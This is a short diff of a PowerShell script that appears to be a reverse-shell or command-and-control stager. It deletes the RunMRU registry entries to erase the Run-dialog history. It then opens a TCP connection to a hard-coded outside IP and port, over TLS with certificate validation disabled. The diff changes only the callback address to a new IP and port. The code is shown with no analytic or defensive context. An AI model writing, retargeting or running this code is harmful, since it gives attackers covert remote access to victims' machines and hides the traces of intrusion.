@@ -1,7 +1,7 @@
 $Reg =  'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
 $Props = Get-Item -Path $Reg | Select-Object -ExpandProperty Property
 foreach ($Prop in $Props) { Remove-ItemProperty -Path $Reg -Name $Prop }
-$so = New-Object Net.Sockets.TcpClient('13.59.15.185', 17599)
+$so = New-Object Net.Sockets.TcpClient('3.141.142.211', 16344)
 $st = $so.GetStream()
 $ss = New-Object System.Net.Security.SslStream($st,$false,({$True} -as   [Net.Security.RemoteCertificateValidationCallback]))
 $ss.AuthenticateAsClient('traefik.me', $null, 'Tls12', $false)
